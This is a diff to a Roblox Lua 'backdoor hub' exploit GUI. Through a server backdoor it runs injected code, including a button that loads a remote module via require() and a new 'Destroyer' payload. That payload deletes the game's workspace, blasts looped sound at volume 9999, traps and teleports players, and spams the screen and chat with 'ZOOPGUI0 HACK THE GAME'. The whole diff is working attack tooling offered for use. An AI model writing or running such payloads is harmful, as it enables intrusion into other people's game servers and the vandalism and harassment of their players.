@@ -160,7 +160,7 @@ LMG2L["info_f"]["TextScaled"] = true;
 LMG2L["info_f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 LMG2L["info_f"]["FontFace"] = Font.new([[rbxasset://fonts/families/PatrickHand.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 LMG2L["info_f"]["Size"] = UDim2.new(0, 220, 0, 32);
-LMG2L["info_f"]["Text"] = [[Z00PGUILOL HUB backdoor]];
+LMG2L["info_f"]["Text"] = [[Z00PGUILOL HUB backdoor by @gavinrgb27]];
 LMG2L["info_f"]["Name"] = [[info]];
 LMG2L["info_f"]["Position"] = UDim2.new(0, 62, 0, 4);
 
@@ -193,10 +193,8 @@ local gui = LMG2L["anjingyes_1"]
 local MAINYUK = LMG2L["MainFrame_4"]
 local fuck = LMG2L["ImageButton_2"]
 
-local open = false
 fuck.MouseButton1Click:Connect(function()
-	open = not open
-	MAINYUK.Visible = open
+ MAINYUK.Visible = not MAINYUK.Visible
 end)
 
 local scan = LMG2L["scan_5"]
@@ -936,6 +934,11 @@ end
 ]]
 runRemote(backdoor, codeText) 
 end)
+createFunctionButton("Zoop Gui v1", function()
+local codeText = 'require(99828653173391).Zoop( "' .. PLAYER_NAME .. '" )'
+Cody.Text = codeText
+runRemote(backdoor, codeText) 
+end)
 createFunctionButton('anime girl sky', function()
 local codeText = [[
 local function ExecuteScare(player)
@@ -1110,5 +1113,167 @@ end
 ]]
 runRemote(backdoor, codeText) 
 end)
+createFunctionButton("Destroyer", function()
+local codeText = [[
+
+local SOUND_ID = "rbxassetid://128802844460270"
+local ChatService = game:GetService("Chat")
+
+local TEXT_SEQUENCES = {
+	"ZOOPGUI0 WAS HEREE",
+	"ZOOPGUI0 FUCK THE GAME!!!!",
+	"RECORD PLS 🙏🏻🙏🏻🙏🏻 @ZOOPGUI0"
+}
+
+local GLITCH_CHARS = {"!","@","#","$","%","^","&","*","?","/",">","<","|","§","Δ","Ξ"}
+
+local s = Instance.new("Sound", game:GetService("SoundService"))
+s.SoundId = SOUND_ID
+s.Volume = 9999
+s.PlaybackSpeed = 0.2
+s.Looped = true
+s.Parent = game:GetService("SoundService")
+s:Play()
+
+task.wait(1.4)
+
+for _, obj in pairs(workspace:GetChildren()) do
+	if not obj:IsA("Camera") and not obj:IsA("Terrain") and not game.Players:GetPlayerFromCharacter(obj) then
+		obj:Destroy()
+	end
+end
+
+local mapBaru = Instance.new("Part")
+mapBaru.Name = "InsaneBaseplate"
+mapBaru.Size = Vector3.new(600, 2, 600)
+mapBaru.Position = Vector3.new(0, 10, 0)
+mapBaru.Anchored = true
+mapBaru.CanCollide = true
+mapBaru.BrickColor = BrickColor.new("Really black")
+mapBaru.Parent = workspace
+
+for _, face in ipairs({"Front","Top","Left","Right","Bottom","Back"}) do
+	local d = Instance.new("Decal", mapBaru)
+	d.Texture = "rbxassetid://"..ID
+	d.Face = Enum.NormalId[face]
+end
+
+for i = 1, 4 do
+	local wall = Instance.new("Part", workspace)
+	wall.Size = Vector3.new(600, 1000, 2)
+	wall.Transparency = 1
+	wall.Anchored = true
+	wall.CanCollide = true
+	if i == 1 then wall.Position = Vector3.new(0, 500, 300)
+	elseif i == 2 then wall.Position = Vector3.new(0, 500, -300)
+	elseif i == 3 then wall.Size = Vector3.new(2, 1000, 600) wall.Position = Vector3.new(300, 500, 0)
+	elseif i == 4 then wall.Size = Vector3.new(2, 1000, 600) wall.Position = Vector3.new(-300, 500, 0) end
+end
+
+task.spawn(function()
+	local rotY = 0
+	while true do
+		rotY = rotY + 90
+		mapBaru.CFrame = CFrame.new(0, 10, 0) * CFrame.Angles(0, math.rad(rotY), 0)
+		task.wait(0.1)
+		rotY = rotY + 90
+		mapBaru.CFrame = CFrame.new(0, 10, 0) * CFrame.Angles(0, math.rad(rotY), math.rad(45))
+		task.wait(0.1)
+		rotY = rotY + 90
+		mapBaru.CFrame = CFrame.new(0, 10, 0) * CFrame.Angles(0, math.rad(rotY), math.rad(-45))
+		task.wait(0.1)
+	end
+end)
+
+local function applyChaos(p)
+	p.CharacterAdded:Connect(function(char)
+		local gui = Instance.new("ScreenGui", p:WaitForChild("PlayerGui"))
+		local img = Instance.new("ImageLabel", gui)
+		img.Size = UDim2.new(1, 0, 1, 0)
+		img.Image = "rbxassetid://"..ID
+		img.BackgroundTransparency = 1
+		task.delay(2, function() gui:Destroy() end)
+
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		task.wait(0.1)
+		hrp.CFrame = CFrame.new(0, 35, 0)
+		for _, v in pairs(char:GetChildren()) do
+			if v:IsA("BasePart") then
+				local pe = Instance.new("ParticleEmitter", v)
+				pe.Texture = "rbxassetid://"..ID
+				pe.Rate = 200
+				pe.Size = NumberSequence.new(5)
+			end
+		end
+	end)
+end
+
+for _, p in pairs(game.Players:GetPlayers()) do applyChaos(p) end
+game.Players.PlayerAdded:Connect(applyChaos)
+
+task.spawn(function()
+	while true do
+		for _, p in pairs(game.Players:GetPlayers()) do
+			if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+				if p.Character.HumanoidRootPart.Position.Y < -5 then
+					p.Character.HumanoidRootPart.CFrame = CFrame.new(0, 35, 0)
+					p.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+				end
+				local char = p.Character
+				if char:FindFirstChild("Humanoid") then
+					char.Humanoid.CameraOffset = Vector3.new(math.random(-2,2), math.random(-2,2), math.random(-2,2))
+				end
+			end
+		end
+		task.wait(0.01)
+	end
+end)
+
+local lighting = game:GetService("Lighting")
+lighting.ClockTime = 14
+lighting.Brightness = 15
+local cc = Instance.new("ColorCorrectionEffect", lighting)
+cc.Saturation = -1000
+
+local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", lighting)
+sky.SkyboxBk = "rbxassetid://"..ID sky.SkyboxDn = "rbxassetid://"..ID sky.SkyboxFt = "rbxassetid://"..ID
+sky.SkyboxLf = "rbxassetid://"..ID sky.SkyboxRt = "rbxassetid://"..ID sky.SkyboxUp = "rbxassetid://"..ID
+
+task.spawn(function()
+	while true do
+		lighting.ClockTime = math.random(0, 24)
+		task.wait(0.03)
+	end
+end)
+
+task.spawn(function()
+	local m = Instance.new("Message", workspace)
+	while true do
+		for _, teks in ipairs(TEXT_SEQUENCES) do
+			for i = 1, 8 do
+				local glitch = ""
+				for j = 1, #teks do glitch = glitch .. GLITCH_CHARS[math.random(1, #GLITCH_CHARS)] end
+				m.Text = glitch
+				task.wait(0.05)
+			end
+			m.Text = teks
+			task.wait(1.5)
+		end
+	end
+end)
+
+task.spawn(function()
+	while true do
+		for _, player in pairs(game.Players:GetPlayers()) do
+			if player.Character and player.Character:FindFirstChild("Head") then
+				ChatService:Chat(player.Character.Head, "ZOOPGUI0 HACK THE GAME", Enum.ChatColor.Red)
+			end
+		end
+		task.wait(0.2)
+	end
+end)
+]]
+runRemote(backdoor, codeText) 
+end) 
 
 return LMG2L["anjingyes_1"], require;
